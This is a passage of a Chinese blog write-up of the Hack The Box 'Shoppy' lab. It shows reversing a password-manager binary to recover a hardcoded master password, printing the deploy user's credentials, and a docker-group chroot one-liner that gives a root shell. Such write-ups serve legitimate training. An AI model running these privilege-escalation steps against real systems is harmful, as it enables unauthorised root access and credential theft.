+
+<p>23、这里，我们把这个文件复制到本地机器上</p>
+<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ scp jaeger@shoppy.htb:/home/deploy/password-manager .   <br>The authenticity <span class="hljs-keyword">of</span> host <span class="hljs-comment">&#x27;shoppy.htb (10.10.11.180)&#x27; can&#x27;t be established.</span><br>ED25519 <span class="hljs-keyword">key</span> fingerprint <span class="hljs-built_in">is</span> SHA256:RISsnnLs1eloK7XlOTr2TwStHh2R8hui07wd1iFyB+<span class="hljs-number">8</span>.<br>This host <span class="hljs-keyword">key</span> <span class="hljs-built_in">is</span> known <span class="hljs-keyword">by</span> the following other names/addresses:<br>    ~/.ssh/known_hosts:<span class="hljs-number">21</span>: [hashed name]<br>Are you sure you want <span class="hljs-keyword">to</span> <span class="hljs-keyword">continue</span> connecting (yes/no/[fingerprint])? yes<br><span class="hljs-symbol">Warning:</span> Permanently added <span class="hljs-comment">&#x27;shoppy.htb&#x27; (ED25519) to the list of known hosts.</span><br>jaeger@shoppy.htb<span class="hljs-comment">&#x27;s password: </span><br>password-manager                                                                                                         <span class="hljs-number">100%</span>   <span class="hljs-number">18</span>KB  <span class="hljs-number">20.7</span>KB/s   <span class="hljs-number">00</span>:<span class="hljs-number">00</span>   <br></code></pre></td></tr></table></figure>
+
+<p>24、简单查看下类型</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ file <span class="hljs-keyword">password</span>-manager                                                                                                               <br><span class="hljs-keyword">password</span>-manager: ELF <span class="hljs-number">64</span>-<span class="hljs-type">bit</span> LSB pie executable, x86<span class="hljs-number">-64</span>, <span class="hljs-keyword">version</span> <span class="hljs-number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="hljs-number">-64.</span>so<span class="hljs-number">.2</span>, BuildID[sha1]=<span class="hljs-number">400</span>b2ed9d2b4121f9991060f343348080d2905d1, <span class="hljs-keyword">for</span> GNU/Linux <span class="hljs-number">3.2</span><span class="hljs-number">.0</span>, <span class="hljs-keyword">not</span> stripped<br></code></pre></td></tr></table></figure>
+
+<p>25、这里有点技能超纲了，经过仔细判断分析，还是能看出来点门道的</p>
+<p>26、下载反编译工具</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">┌──(kali㉿offsec)-<span class="hljs-selector-attr">[~/Desktop]</span><br>└─$ sudo apt install ghidra<br></code></pre></td></tr></table></figure>
+
+<p>27、对该文件进行反编译的查看</p>
+<p><img src="http://sh1yan.top/photo/Shoppy-htb-writeup/13.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="http://sh1yan.top/photo/Shoppy-htb-writeup/14.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs ruby">bool main(void)<br><br>&#123;<br>  int iVar1;<br>  basic_ostream *pbVar2;<br>  basic_string&lt;&gt; local_68 [<span class="hljs-number">32</span>];<br>  basic_string local_48 [<span class="hljs-number">47</span>];<br>  allocator&lt;char&gt; local_19 [<span class="hljs-number">9</span>];<br>  <br>  pbVar2 = std::operator&lt;&lt;((basic_ostream *)std::cout,<span class="hljs-string">&quot;Welcome to Josh password manager!&quot;</span>);<br>  std::basic_ostream&lt;&gt;<span class="hljs-symbol">:</span><span class="hljs-symbol">:operator&lt;&lt;</span>((basic_ostream&lt;&gt; *)pbVar2,std::endl&lt;&gt;);<br>  std::operator&lt;&lt;((basic_ostream *)std::cout,<span class="hljs-string">&quot;Please enter your master password: &quot;</span>);<br>  std::<span class="hljs-symbol">__cxx11:</span><span class="hljs-symbol">:basic_string&lt;&gt;</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:basic_string</span>();<br>                    <span class="hljs-regexp">/* try &#123; /</span><span class="hljs-regexp">/ try from 00101263 to 00101267 has its CatchHandler @ 001013cb */</span><br>  std::operator&gt;&gt;((basic_istream *)std::cin,local_48);<br>  std::allocator&lt;char&gt;<span class="hljs-symbol">:</span><span class="hljs-symbol">:allocator</span>();<br>                    <span class="hljs-regexp">/* try &#123; /</span><span class="hljs-regexp">/ try from 00101286 to 0010128a has its CatchHandler @ 001013a9 */</span><br>  std::<span class="hljs-symbol">__cxx11:</span><span class="hljs-symbol">:basic_string&lt;&gt;</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:basic_string</span>((char *)local_68,(allocator *)&amp;DAT_0010205c);<br>  std::allocator&lt;char&gt;<span class="hljs-symbol">:</span><span class="hljs-symbol">:~allocator</span>(local_19);<br>                    <span class="hljs-regexp">/* try &#123; /</span><span class="hljs-regexp">/ try from 001012a5 to 00101387 has its CatchHandler @ 001013ba */</span><br>  std::<span class="hljs-symbol">__cxx11:</span><span class="hljs-symbol">:basic_string&lt;&gt;</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:operator+</span>=(local_68,<span class="hljs-string">&quot;S&quot;</span>);<br>  std::<span class="hljs-symbol">__cxx11:</span><span class="hljs-symbol">:basic_string&lt;&gt;</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:operator+</span>=(local_68,<span class="hljs-string">&quot;a&quot;</span>);<br>  std::<span class="hljs-symbol">__cxx11:</span><span class="hljs-symbol">:basic_string&lt;&gt;</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:operator+</span>=(local_68,<span class="hljs-string">&quot;m&quot;</span>);<br>  std::<span class="hljs-symbol">__cxx11:</span><span class="hljs-symbol">:basic_string&lt;&gt;</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:operator+</span>=(local_68,<span class="hljs-string">&quot;p&quot;</span>);<br>  std::<span class="hljs-symbol">__cxx11:</span><span class="hljs-symbol">:basic_string&lt;&gt;</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:operator+</span>=(local_68,<span class="hljs-string">&quot;l&quot;</span>);<br>  std::<span class="hljs-symbol">__cxx11:</span><span class="hljs-symbol">:basic_string&lt;&gt;</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:operator+</span>=(local_68,<span class="hljs-string">&quot;e&quot;</span>);<br>  iVar1 = std::<span class="hljs-symbol">__cxx11:</span><span class="hljs-symbol">:basic_string&lt;&gt;</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:compare</span>(local_48);<br>  <span class="hljs-keyword">if</span> (iVar1 != <span class="hljs-number">0</span>) &#123;<br>    pbVar2 = std::operator&lt;&lt;((basic_ostream *)std::cout,<br>                             <span class="hljs-string">&quot;Access denied! This incident will be reported !&quot;</span>);<br>    std::basic_ostream&lt;&gt;<span class="hljs-symbol">:</span><span class="hljs-symbol">:operator&lt;&lt;</span>((basic_ostream&lt;&gt; *)pbVar2,std::endl&lt;&gt;);<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;<br>    pbVar2 = std::operator&lt;&lt;((basic_ostream *)std::cout,<span class="hljs-string">&quot;Access granted! Here is creds !&quot;</span>);<br>    std::basic_ostream&lt;&gt;<span class="hljs-symbol">:</span><span class="hljs-symbol">:operator&lt;&lt;</span>((basic_ostream&lt;&gt; *)pbVar2,std::endl&lt;&gt;);<br>    system(<span class="hljs-string">&quot;cat /home/deploy/creds.txt&quot;</span>);<br>  &#125;<br>  std::<span class="hljs-symbol">__cxx11:</span><span class="hljs-symbol">:basic_string&lt;&gt;</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:~basic_string</span>(local_68);<br>  std::<span class="hljs-symbol">__cxx11:</span><span class="hljs-symbol">:basic_string&lt;&gt;</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:~basic_string</span>((basic_string&lt;&gt; *)local_48);<br>  <span class="hljs-keyword">return</span> iVar1 != <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>28、这里的门道就是发现了 Sample 这个硬编码的内容，开始利用</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs elixir">jaeger<span class="hljs-variable">@shoppy</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>sudo -u deploy /home/deploy/password-manager<br>[sudo] password <span class="hljs-keyword">for</span> <span class="hljs-symbol">jaeger:</span> <br><span class="hljs-title class_">Welcome</span> to <span class="hljs-title class_">Josh</span> password manager!<br><span class="hljs-title class_">Please</span> enter your master <span class="hljs-symbol">password:</span> <span class="hljs-title class_">Sample</span><br><span class="hljs-title class_">Access</span> granted! <span class="hljs-title class_">Here</span> is creds !<br><span class="hljs-title class_">Deploy</span> <span class="hljs-title class_">Creds</span> :<br><span class="hljs-symbol">username:</span> deploy<br><span class="hljs-symbol">password:</span> <span class="hljs-title class_">Deploying</span><span class="hljs-variable">@pp</span>!<br>jaeger<span class="hljs-variable">@shoppy</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span><br></code></pre></td></tr></table></figure>
+
+<p>29、获取到deploy用户的密码凭证信息</p>
+<p>30、开始切换用户，并枚举</p>
+<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs tap">jaeger@shoppy:~$ su deploy<br>Password: <br>$ <br>$ id<br>uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)<br>$ pwd<br>/home/jaeger<br>$ cd ~<br>$ pwd<br>/home/deploy<br>$ ls -la<br>total 52<br>drwxr-xr-x<span class="hljs-number"> 3 </span>deploy deploy <span class="hljs-number"> 4096 </span>Jul<span class="hljs-number"> 23 </span><span class="hljs-number"> 2022 </span>.<br>drwxr-xr-x<span class="hljs-number"> 4 </span>root   root   <span class="hljs-number"> 4096 </span>Jul<span class="hljs-number"> 22 </span><span class="hljs-number"> 2022 </span>..<br>lrwxrwxrwx<span class="hljs-number"> 1 </span>deploy deploy    <span class="hljs-number"> 9 </span>Jul<span class="hljs-number"> 22 </span><span class="hljs-number"> 2022 </span>.bash_history -&gt; /dev/null<br>-rw-r--r--<span class="hljs-number"> 1 </span>deploy deploy  <span class="hljs-number"> 220 </span>Mar<span class="hljs-number"> 27 </span><span class="hljs-number"> 2022 </span>.bash_logout<br>-rw-r--r--<span class="hljs-number"> 1 </span>deploy deploy <span class="hljs-number"> 3526 </span>Mar<span class="hljs-number"> 27 </span><span class="hljs-number"> 2022 </span>.bashrc<br>-rw-------<span class="hljs-number"> 1 </span>deploy deploy   <span class="hljs-number"> 56 </span>Jul<span class="hljs-number"> 22 </span><span class="hljs-number"> 2022 </span>creds.txt<br>lrwxrwxrwx<span class="hljs-number"> 1 </span>deploy deploy    <span class="hljs-number"> 9 </span>Jul<span class="hljs-number"> 23 </span><span class="hljs-number"> 2022 </span>.dbshell -&gt; /dev/null<br>drwx------<span class="hljs-number"> 3 </span>deploy deploy <span class="hljs-number"> 4096 </span>Jul<span class="hljs-number"> 23 </span><span class="hljs-number"> 2022 </span>.gnupg<br>-rwxr--r--<span class="hljs-number"> 1 </span>deploy deploy<span class="hljs-number"> 18440 </span>Jul<span class="hljs-number"> 22 </span><span class="hljs-number"> 2022 </span>password-manager<br>-rw-------<span class="hljs-number"> 1 </span>deploy deploy  <span class="hljs-number"> 739 </span>Feb <span class="hljs-number"> 1 </span><span class="hljs-number"> 2022 </span>password-manager.cpp<br>-rw-r--r--<span class="hljs-number"> 1 </span>deploy deploy  <span class="hljs-number"> 807 </span>Mar<span class="hljs-number"> 27 </span><span class="hljs-number"> 2022 </span>.profile<br>$ cat /etc/passwd | grep &quot;deploy&quot;<br>deploy:x:1001:1001::/home/deploy:/bin/sh<br>$ <br>$ docker images<br>REPOSITORY   TAG       IMAGE ID       CREATED       SIZE<br>alpine       latest    d7d3d98c851f  <span class="hljs-number"> 2 </span>years ago   5.53MB<br>$ <br></code></pre></td></tr></table></figure>
+
+<p>31、这里用户拥有 docker 组的权限，直接利用HTB学院里的特权组利用章节，一套带走</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ docker <span class="hljs-built_in">run</span> -v /:/mnt --rm -it alpine chroot /mnt sh<br><span class="hljs-comment"># id</span><br><span class="hljs-attribute">uid</span>=0(root) <span class="hljs-attribute">gid</span>=0(root) <span class="hljs-attribute">groups</span>=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)<br><span class="hljs-comment"># cd /root</span><br><span class="hljs-comment"># lss</span><br>sh: 3: lss: <span class="hljs-keyword">not</span> found<br><span class="hljs-comment"># ls</span><br>root.txt<br><span class="hljs-comment"># cat root      ^H^H^H^H^H</span><br>cat: root: <span class="hljs-literal">No</span> such file <span class="hljs-keyword">or</span> directory<br>cat: <span class="hljs-string">&#x27;&#x27;</span>$<span class="hljs-string">&#x27;\b\b\b\b\b&#x27;</span>: <span class="hljs-literal">No</span> such file <span class="hljs-keyword">or</span> directory<br><span class="hljs-comment"># cat root.txt</span><br>ba39063a210d2db8385c84186d6e8a8c<br><span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>
+
+
+<h4 id="0x03-通关凭证展示"><a href="#0x03-通关凭证展示" class="headerlink" title="0x03 通关凭证展示"></a>0x03 通关凭证展示</h4><p><code>https://www.hackthebox.com/achievement/machine/1705469/496</code></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%89%93%E9%9D%B6%E8%AE%B0/" class="category-chain-item">打靶记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/shooting-range/" class="print-no-link">#shooting-range</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Shoppy-htb-writeup</div>
+      <div>https://sh1yan.top/2024/09/24/Shoppy-htb-writeup/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>shiyan</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年9月24日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/09/25/Trick-htb-writeup/" title="Trick-htb-writeup">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Trick-htb-writeup</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/09/23/MetaTwo-htb-writeup/" title="MetaTwo-htb-writeup">
+                        <span class="hidden-mobile">MetaTwo-htb-writeup</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2024</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
